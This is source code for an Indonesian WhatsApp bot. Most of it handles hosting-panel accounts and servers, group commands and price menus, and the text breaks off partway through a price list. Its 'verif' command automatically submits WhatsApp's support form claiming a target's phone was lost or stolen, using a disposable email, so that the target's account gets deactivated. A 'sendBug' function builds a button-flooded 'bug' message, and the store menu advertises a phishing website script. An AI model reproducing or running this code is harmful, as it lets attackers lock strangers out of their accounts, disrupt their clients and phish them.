require('../RizkyEditzInfo/rizkyeditzsettings')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require("@adiwajshing/baileys");
const fs = require("fs");
const os = require('os');
const chalk = require("chalk");
const crypto = require("crypto");
const { exec, spawn, execSync } = require("child_process");
const axios = require("axios");
const moment = require("moment-timezone");
const fetch = require("node-fetch");
const Jimp = require("jimp");
const util = require("util");
const { sizeFormatter} = require("human-readable")
const format = sizeFormatter()
const { tiktokdl } = require('./lib/tiktok')
const { color, bgcolor, mycolor } = require('./lib/color')
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid } = require('./lib/exif')
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, parseMention, getRandom } = require('./lib/functions')
const addusrp = JSON.parse(fs.readFileSync('./RizkyEditz/database/user.json'))

module.exports = zassxd = async (zassxd, m, chatUpdate, store) => {
try {
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°#*+,.?=''():√%!¢£¥€π¤ΠΦ_&`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°#*+,.?=''():√%¢£¥€π¤ΠΦ_&!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
const content = JSON.stringify(m.message)
const { type, quotedMsg, mentioned, now, fromMe } = m
const isCmd = body.startsWith(prefix)
const from = m.key.remoteJid
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = await zassxd.decodeJid(zassxd.user.id)
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const itsMe = m.sender == botNumber ? true : false
const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const { chats } = m

const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await zassxd.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = m.isGroup ? groupMetadata.owner : ''
const groupMembers = m.isGroup ? groupMetadata.participants : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false

if (!zassxd.public) {
if (!m.key.fromMe) return
}

if (isCmd && m.isGroup) { console.log(chalk.bold.rgb(255, 178, 102)('\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mCMD\x1b[1;37m]'), chalk.bold.rgb(153, 255, 153)(command), chalk.bold.rgb(204, 204, 0)("from"), chalk.bold.rgb(153, 255, 204)(pushname), chalk.bold.rgb(204, 204, 0)("in"), chalk.bold.rgb(255, 178, 102)("Group Chat"), chalk.bold('[' + args.length + ']')); }
if (isCmd && !m.isGroup) { console.log(chalk.bold.rgb(255, 178, 102)('\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mCMD\x1b[1;37m]'), chalk.bold.rgb(153, 255, 153)(command), chalk.bold.rgb(204, 204, 0)("from"), chalk.bold.rgb(153, 255, 204)(pushname), chalk.bold.rgb(204, 204, 0)("in"), chalk.bold.rgb(255, 178, 102)("Private Chat"), chalk.bold('[' + args.length + ']')); }
		
try {
ppuser = await zassxd.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)

const generateProfilePicture = async(buffer) => {
const jimp_1 = await Jimp.read(buffer);
const resz = jimp_1.getWidth() > jimp_1.getHeight() ? jimp_1.resize(550, Jimp.AUTO) : jimp_1.resize(Jimp.AUTO, 650)
const jimp_2 = await Jimp.read(await resz.getBufferAsync(Jimp.MIME_JPEG));
return {
img: await resz.getBufferAsync(Jimp.MIME_JPEG)
}
}

const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}

function randomNomor(min, max = null) {
if (max !== null) {
min = Math.ceil(min);
max = Math.floor(max);
return Math.floor(Math.random() * (max - min + 1)) + min;
} else {
return Math.floor(Math.random() * min) + 1
}
}
function monospace(string) {
return '```' + string + '```'
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

const sendBug = async (target) => {
zassxd.sendMessage(target, {
text: '', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `6285876501859`}},
{ urlButton: { displayText: `OWNER`, url: `https://wa.me/6285876501859`}},
{ urlButton: { displayText: `ID GORUP`, url: `https://www.whatsapp.com/otp/copy/${from}`}},
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `6285876501859`}},
{ urlButton: { displayText: `OWNER`, url: `https://wa.me/6285876501859`}},
{ urlButton: { displayText: `ID GORUP`, url: `https://www.whatsapp.com/otp/copy/${from}`}},
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `6285876501859`}},
{ urlButton: { displayText: `OWNER`, url: `https://wa.me/6285876501859`}},
{ urlButton: { displayText: `ID GORUP`, url: `https://www.whatsapp.com/otp/copy/${from}`}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `${prefix}rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `${prefix}x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `${prefix}sewa`}}]}
)
}

global.addUserPanel = (email, username, expired, _db) => {
var obj_add = {
email: email,
username: username,
expired: expired
}
_db.push(obj_add)
fs.writeFileSync('./RizkyEditz/database/user.json', JSON.stringify(_db, null, 3))
}

switch (command) {

case "listusr": {
if (!isCreator) return m.reply(`Maaf Command Tersebut Khusus Developer Bot WhatsApp`)
let page = args[0] ? args[0] : '1'
let f = await fetch(domain + "/api/application/users?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let users = res.data
let sections = []
for (let user of users) {
let u = user.attributes
let obj = {
title: "-- RizkyEditz --",
rows: [
{ title: `${u.id}. ${u.username}`, rowId: `${prefix}detusr ` + u.id, description: u.first_name + ' ' + u.last_name },
]
}
await sections.push(obj)
if (sections.length === 50) {
sections.push({
title: "-- RizkyEditz --",
rows: [
{ title: `⏩ NEXT`, rowId: `${prefix}listusr 2`, description: 'Page 2' },
{ title: `⏩ NEXT`, rowId: `${prefix}listusr 3`, description: 'Page 3' },
{ title: `⏩ NEXT`, rowId: `${prefix}listusr 4`, description: 'Page 4' },
{ title: `⏩ NEXT`, rowId: `${prefix}listusr 5`, description: 'Page 5' },
]
})
}
}
await zassxd.sendMessage(m.chat, {
text: "Berikut list user *RizkyEditz*",
footer: `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}`,
title: "*RizkyEditz*",
buttonText: `${res.meta.pagination.count} Users`,
sections
},{ quoted : m })
}
break

case "addusr": {

  if (!isCreator) return m.reply(`Maaf Command Tersebut Khusus Developer RizkyBotz WhatsApp`)
  let t = text.split(',');
  let username = t[0];
  let passlog = t[1];
  let mailnya = t[2];
  let f = await fetch(domain + "/api/application/users", {
  "method": "POST",
  "headers": {
  "Accept": "application/json",
  "Content-Type": "application/json",
  "Authorization": "Bearer " + apikey
  },
  "body": JSON.stringify({
  "email": mailnya,
  "username": username,
  "first_name": username,
  "last_name": "MEMBER",
  "language": "en",
  "password": passlog
  })
  })
  let data = await f.json();
  if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
  let user = data.attributes
  let p = await 
  zassxd.sendMessage(m.chat, { text: `*BERIKUT DETAIL AKUN PANEL ANDA*\n
🆔: ${user.id}
📬EMAIL : ${mailnya}
👤USERNAME: ${username}
🔐PASSWORD: ${passlog}
  
☢️CREATED AT: ${user.created_at}
🖥️LOGIN: ${domain}
  
TUTORIAL PAKAI SILAHKAN CEK :
  
youtube.com/@RizkyEditz556`,
  })
  }
  break

case "delusr": {

if (!isCreator) return m.reply(`Maaf Command Tersebut Khusus Developer RizkyBotz WhatsApp`)
let usr = args[0]
if (!usr) return m.reply('ID nya mana?')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return m.reply('*USER NOT FOUND*')
m.reply('*SUCCESSFULLY DELETE THE USER*')
}
break
case "detusr": {
if (!isCreator) return m.reply(`Maaf Command Tersebut Khusus *RizkyEditz*`)
let usr = args[0]
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json()
if (res.errors) return m.reply('*USER NOT FOUND*')
let u = res.attributes
m.reply(`*${u.username.toUpperCase()} USER DETAILS*

\`\`\`ID: ${u.id}
UUID: ${u.uuid}
USERNAME: ${u.username}
EMAIL: ${u.email}
NAME: ${u.first_name} ${u.last_name}
LANGUAGE: ${u.language}
ADMIN: ${u.root_admin}
CREATED AT: ${u.created_at}\`\`\``)
}
break
case "listsrv": {
if (!isCreator) return m.reply(`Maaf Command Tersebut Khusus *RizkyEditz*`)
let page = args[0] ? args[0] : '1'
let f = await fetch(domain + "/api/application/servers?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let servers = res.data
let sections = []
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let obj = {
title: "-- RizkyEditz --",
rows: [
{ title: `${s.id}. ${s.name}`, rowId: `${prefix}detsrv ` + s.id, description: `Status: ${data.attributes ? data.attributes.current_state : s.status}` },
]
}
await sections.push(obj)
if (sections.length >= 50 && res.meta.pagination.links.next) {
sections.push({
title: "-- RizkyEditz --",
rows: [
{ title: `⏩ NEXT`, rowId: `${prefix}listsrv 2`, description: 'Page 2' },
{ title: `⏩ NEXT`, rowId: `${prefix}listsrv 3`, description: 'Page 3' },
{ title: `⏩ NEXT`, rowId: `${prefix}listsrv 4`, description: 'Page 4' },
{ title: `⏩ NEXT`, rowId: `${prefix}listsrv 5`, description: 'Page 5' },
]
})
}
}
await zassxd.sendMessage(m.chat, {
text: "Berikut list server *RizkyEditz*",
footer: `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}`,
title: "*RizkyEditz*",
buttonText: `${res.meta.pagination.count} Servers`,
sections
}, { quoted: m })
}
break

case "addsrv": {

  if (!isCreator) return m.reply(`Maaf Command Tersebut Khusus Developer Bot WhatsApp`)
  let s = text.split(',');
  if (s.length < 7) return m.reply(`Format Salah!!!\n\nContoh :\nNickPanel,Deskpanel,IdUser,15,loc,0/0,0`)
  let name = s[0];
  let desc = s[1] || ''
  let usr_id = s[2];
  let egg = s[3];
  let loc = s[4];
  let memo_disk = s[5].split`/`;
  let cpu = s[6];
  
  let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
  "method": "GET",
  "headers": {
  "Accept": "application/json",
  "Content-Type": "application/json",
  "Authorization": "Bearer " + apikey
  }
  })
  let data = await f1.json();
  let startup_cmd = data.attributes.startup
  
  let f = await fetch(domain + "/api/application/servers", {
  "method": "POST",
  "headers": {
  "Accept": "application/json",
  "Content-Type": "application/json",
  "Authorization": "Bearer " + apikey,
  },
  "body": JSON.stringify({
  "name": name,
  "description": desc,
  "user": usr_id,
  "egg": parseInt(egg),
  "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
  "startup": startup_cmd,
  "environment": {
  "INST": "npm",
  "USER_UPLOAD": "0",
  "AUTO_UPDATE": "0",
  "CMD_RUN": "npm start"
  },
  "limits": {
  "memory": memo_disk[0],
  "swap": 0,
  "disk": memo_disk[1],
  "io": 500,
  "cpu": cpu
  },
  "feature_limits": {
  "databases": 5,
  "backups": 5,
  "allocations": 5
  },
  deploy: {
  locations: [parseInt(loc)],
  dedicated_ip: false,
  port_range: [],
  },
  })
  })
  let res = await f.json()
  if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
  let server = res.attributes
m.reply(`*SUCCESSFULLY ADD SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${server.created_at}`)
}
break
case "addsrv": {

if (!isCreator) return m.reply(`Maaf Command Tersebut Khusus Developer Bot WhatsApp`)
let s = text.split(',');
if (s.length < 7) return m.reply(`PANEL, ,1,15,loc,0/0,0`)
let name = s[0];
let desc = s[1] || ''
let usr_id = s[2];
let egg = s[3];
let loc = s[4];
let memo_disk = s[5].split`/`;
let cpu = s[6];

let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data = await f1.json();
let startup_cmd = data.attributes.startup

let f = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo_disk[0],
"swap": 0,
"disk": memo_disk[1],
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
m.reply(`*SUCCESSFULLY ADD SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${server.created_at}`)
}
break
case "delsrv": {

if (!isCreator) return m.reply(`Maaf Command Tersebut Khusus Developer Bot WhatsApp`)
let srv = args[0]
if (!srv) return m.reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return m.reply('*SERVER NOT FOUND*')
m.reply('*SUCCESSFULLY DELETE THE SERVER*')
}
break
case "detsrv": {

let srv = args[0]
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
if (res.errors) return m.reply('*SERVER NOT FOUND*')
let s = res.attributes
let f2 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f2.json();
let t = data.attributes
m.reply(`*${s.name.toUpperCase()} SERVER DETAILS*

STATUS: ${t.current_state}

ID: ${s.id}
UUID: ${s.uuid}
NAME: ${s.name}
DESCRIPTION: ${s.description}
MEMORY: ${await (format(t.resources.memory_bytes)).toString()} / ${s.limits.memory === 0 ? 'Unlimited' : s.limits.memory + 'MB'}
DISK: ${await (format(t.resources.disk_bytes)).toString()} / ${s.limits.disk === 0 ? 'Unlimited' : s.limits.disk + 'MB'}
CPU: ${t.resources.cpu_absolute}% / ${s.limits.cpu === 0 ? 'Unlimited' : s.limits.cpu + '%'}
CREATED AT: ${s.created_at}`)
}
break
        
case 'speedtest': {
if (!isCreator) throw mess.owner
m.reply('Testing Speed...')
let cp = require('child_process')
let { promisify } = require('util')
let exec = promisify(cp.exec).bind(cp)
let o
try {
o = await exec('python3 speed.py --share --secure')
} catch (e) {
o = e
} finally {
/*let buttons = [
{ buttonId: 'menu', buttonText: { displayText: 'MENU' }, type: 1 },
{ buttonId: 'ping', buttonText: { displayText: 'PING' }, type: 1 }
]*/
let { stdout, stderr } = o
if (stdout.trim()) zassxd.sendButtonText(m.chat, [{ buttonId: 'ping', buttonText: { displayText: 'PING BOT' }, type: 1 }], `SPEED RESPON RIZKYBOTZ`, stdout, null, zassxd.user.name, m)
if (stderr.trim()) m.reply(stderr)
}
}
break

case 'verif': {
  if (!isCreator) return
if (!q) return m.reply(`Targetnya?`)
var axioss = require ("axios")
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}
})
m.reply(`done`)
}
break

case 'melanggar': case 'kick':
{
   if (!isGroupAdmins) return m.reply('Perintah ini hanya bisa digunakan oleh Admin Grup')
   m.reply(`otw kick`)
   let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
   await zassxd.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
   }
   break
        
case 'h':
case 'hidetag':
case 'tag': {
      if (!isGroupAdmins) return m.reply('Perintah ini hanya bisa digunakan oleh Admin Grup')  
zassxd.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break
        
case 'tagall':
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (!q) return m.reply(`Teks?`)
let teks_tagall = `══✪〘 *👥 Tag All* 〙✪══\n\n${q ? q : ''}\n\n`
for (let mem of participants) {
teks_tagall += `⚘ @${mem.id.split('@')[0]}\n`
}
zassxd.sendMessage(from, { text: teks_tagall, mentions: participants.map(a => a.id) })
break

        
 case 'allmenu': case '? all':{
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
var no = 1
var ad = 1
var footer_nya =`RizkyEditz`
var menu_nya =`Hai Kak *${m.pushName}*\n\n╔═══《 _𝙼𝙴𝙽𝚄_ 》════⊱
╠➤ : Website
╠➤ : Store
╠➤ : Groupmenu
╠➤ : Ownermenu
╠➤ : Llog
╚═════════════⊱
╔═══《 _𝚂𝚃𝙾𝚁𝙴_ 》════⊱
╠➤ : Bayar
╠➤ : Listpanel
╠➤ : Pembuatanpanel
╠➤ : Jasarun
╠➤ : Buysc
╠➤ : Untungsc
╠➤ : Promo
╠➤ : Owner
╚═════════════⊱
╔═══《 _𝙶𝚁𝙾𝚄𝙿_ 》════⊱
╠➤ : Gc o/c
╠➤ : Revoke/R
╠➤ : Lgc 
╠➤ : k/kick @
╠➤ : Hidetag/tag
╠➤ : Tagall text
╚═════════════⊱
╔═══《 _𝙾𝚆𝙽𝙴𝚁_ 》════⊱
╠➤ : Listusr
╠➤ : Listsrv
╠➤ : Addusr
╠➤ : Addsrv
╠➤ : Delusr
╠➤ : Delsrv
╠➤ : Isi
╚═════════════⊱
╔═══《 𝑹𝑼𝑵𝑻𝑰𝑴𝑬 》═══⊱
╠❏ *${runtime(process.uptime())}*
╚════[ ᄃﾘﾑﾑ ]══════⊱
- RizkyEditz  :
youtube.com/@RizkyEditz556`
var buttonMessage = {
text: menu_nya,
footer: footer_nya,
mentions: [sender],
buttons: [
{ buttonId: 'web', buttonText: {displayText: 'WEBSITE'}, type: 1},
],
headerType: 1
}
zassxd.sendMessage(from, buttonMessage)
}
break   
        
case "menu1" :{
m.reply(`╔═══《 _𝙼𝙴𝙽𝚄_ 》════⊱
╠➤ : Ytku
╠➤ : Store
╠➤ : Groupmenu
╠➤ : Ownermenu
╚═════════════⊱
╔═══《 𝑹𝑼𝑵𝑻𝑰𝑴𝑬 》═══⊱
╠❏ *${runtime(process.uptime())}*
╚════[ ᄃﾘﾑﾑ ]══════⊱
- RizkyEditz  :
*ᴊᴀɴɢᴀɴ ʟᴜᴘᴀ ꜱᴜʙꜱ ʏ ᴛᴏᴅ*
youtube.com/@RizkyEditz556`)}
break

case "groupmenu" : {
m.reply(`╔═══《 _𝙶𝚁𝙾𝚄𝙿_ 》════⊱
╠➤ : Gc o/c
╠➤ : Revoke/R
╠➤ : Lgc 
╠➤ : Kick @
╠➤ : Hidetag
╠➤ : Tagall text
╚═════════════⊱
╔═══《 𝑹𝑼𝑵𝑻𝑰𝑴𝑬 》═══⊱
╠❏ *${runtime(process.uptime())}*
╚════[ ᄃﾘﾑﾑ ]══════⊱
- RizkyEditz  :
*ᴊᴀɴɢᴀɴ ʟᴜᴘᴀ ꜱᴜʙꜱ ʏ ᴛᴏᴅ*
youtube.com/@RizkyEditz556`)}
break
case "ownermenu" : {
m.reply(`╔═══《 _𝙾𝚆𝙽𝙴𝚁_ 》════⊱
╠➤ : Listusr
╠➤ : Listsrv
╠➤ : Addusr
╠➤ : Addsrv
╠➤ : Delusr
╠➤ : Delsrv
╠➤ : Isi
╚═════════════⊱
╔═══《 𝑹𝑼𝑵𝑻𝑰𝑴𝑬 》═══⊱
╠❏ *${runtime(process.uptime())}*
╚════[ ᄃﾘﾑﾑ ]══════⊱
- RizkyEditz  :
*ᴊᴀɴɢᴀɴ ʟᴜᴘᴀ ꜱᴜʙꜱ ʏ ᴛᴏᴅ*
youtube.com/@RizkyEditz556`
)}
break
        
case "zassxds":
{
m.reply(`SILAHKAN INSTALL APK TERLEBIH DAHULU\nJIKA TIDAK BISA SILAHKAN LEWAT WEB\n\nhttps://www.mediafire.com/file/hgmppztd34xos0u/ZassXD.apk/file`)
 }
break
        case "llog":
{
m.reply(`*LINK PANEL AKAN DI BERIKAN JIKA KAMU SUDAH MEMBELI AKUN PANEL DI RIZKYEDITZ*\nJika Minat Beli Ketik #listpanel Agar Tahu List Harga Panelnya`)
 }
break
        
case "gcku":
{
m.reply(`*BERIKUT ADALAH LINK GROUP KU*
https://chat.whatsapp.com/I3vA3TS6Au81uO35sgNg3i`)
 }
break

case 'stats' : {
m.reply(`💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}`)
    }
        break

case 'runtime' : {
 m.reply(` BOT AKTIF SELAMA : ${runtime(process.uptime())} `)}
 break

case 'r': 
if (!isCreator) return 
await zassxd.groupRevokeInvite(from)
.then( res => {
m.reply(`Sukses menyetel tautan undangan grup ini`)
}).catch(() => m.reply(mess.error.api))
break

case 'gc': case 'group':
        if (!isGroupAdmins) return m.reply('Perintah ini hanya bisa digunakan oleh Admin Grup')  
      if (!q) return m.reply(`Kirim perintah #${command} _options_\nOptions : close & open\nContoh : #${command} close`)
  if (args[0] == "c") {
  zassxd.groupSettingUpdate(from, 'announcement')
  m.reply(`Sukses mengizinkan hanya admin yang dapat mengirim pesan ke grup ini`)
  } else if (args[0] == "o") {
  zassxd.groupSettingUpdate(from, 'not_announcement')
  m.reply(`Sukses mengizinkan semua peserta dapat mengirim pesan ke grup ini`)
  } else {
  m.reply(`Kirim perintah #${command} _options_\nOptions : close & open\nContoh : #${command} close`)
  }
  break

 case 'lgc': case 'linkgc' :
      if (!isGroupAdmins) return m.reply('Perintah ini hanya bisa digunakan oleh Admin Grup')  
   var url = await zassxd.groupInviteCode(from).catch(() => m.reply(mess.error.api))
url = '*BERIKUT ADALAH LINK GROUP INI*\nhttps://chat.whatsapp.com/'+url
m.reply(url)
break

case 'rules': {
        m.reply(`-*BEBAS SHARE LINK/SC*\n-*DILARANG KERAS JUALAN PANEL*\nhargai admin`) }
        break

case 'owner':{
        zassxd.sendContact(m.chat, owner, m)
        }
        break

case "ytku": case "youtube": {
m.reply(`Hai Kak, Berikut Akun YouTube Ku 👇👇\n(Link YT lu)`)
}
break

 case 'pembuatanpanel':{
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
var no = 1
var ad = 1
var footer_nya =`RizkyEditz`
var menu_nya =`OPEN JASA PEMBUATAN SERVER PANEL 

20gb // 40k
40gb // 800k
80gb // 140k
GARANSI 15DAY`
var buttonMessage = {
text: menu_nya,
footer: footer_nya,
mentions: [sender],
buttons: [
{ buttonId: 'pay', buttonText: {displayText: 'PAYMENT'}, type: 1}
],
headerType: 1
}
zassxd.sendMessage(from, buttonMessage)
}
break
        
case 'jasarun':{
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
var no = 1
var ad = 1
var footer_nya =`RizkyEditz`
var menu_nya =`JASA RUN BOT
-Run 7 Hari : 5k
-Run 30 Hari : 15k`
var buttonMessage = {
text: menu_nya,
footer: footer_nya,
mentions: [sender],
buttons: [
{ buttonId: 'pay', buttonText: {displayText: 'PAYMENT'}, type: 1}
],
headerType: 1
}
zassxd.sendMessage(from, buttonMessage)
}
break
  
 case 'buyvps': case 'listvps': {
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
var no = 1
var ad = 1
var footer_nya =`RizkyEditz`
var menu_nya =`LIST VPS

2gb // 30k
4gb // 60k
8gb // 95k`
var buttonMessage = {
text: menu_nya,
footer: footer_nya,
mentions: [sender],
buttons: [
{ buttonId: 'pay', buttonText: {displayText: 'PAYMENT'}, type: 1}
],
headerType: 1
}
zassxd.sendMessage(from, buttonMessage)
}
break
        
case 'buysc':{
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
var no = 1
var ad = 1
var footer_nya =`RizkyEditz`
var menu_nya =`Script Bot Wa

sc akun panel + store // 50k
sc web p // 40k
600+ fiture  // 25k
Sc Web Phising Auto Ress // 30k`
var buttonMessage = {
text: menu_nya,
footer: footer_nya,
mentions: [sender],
buttons: [
{ buttonId: 'pay', buttonText: {displayText: 'PAYMENT'}, type: 1}
],
headerType: 1
}
zassxd.sendMessage(from, buttonMessage)
}
break
        
case 'listpanel': case 'buypanel': case 'panel':{
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
var no = 1
var ad = 1
var footer_nya =`Minat Beli?\nChat wa.me/6285876501859`
var menu_nya =`*LIST HARGA PANEL BY RIZKYEDITZ*

📮 1 GB 35% CPU 5K/1BULAN

📮 2 GB 60% CPU 8K/1BULAN

📮 3 GB 85% CPU 10K/1BULAN

📮 4 GB 100% CPU 15K/1BULAN

📮 5 GB 135% CPU 25K/1BULAN

📮 6 GB 150% CPU 30K/1BULAN

📮 7 GB 180% CPU 35K 1BULAN

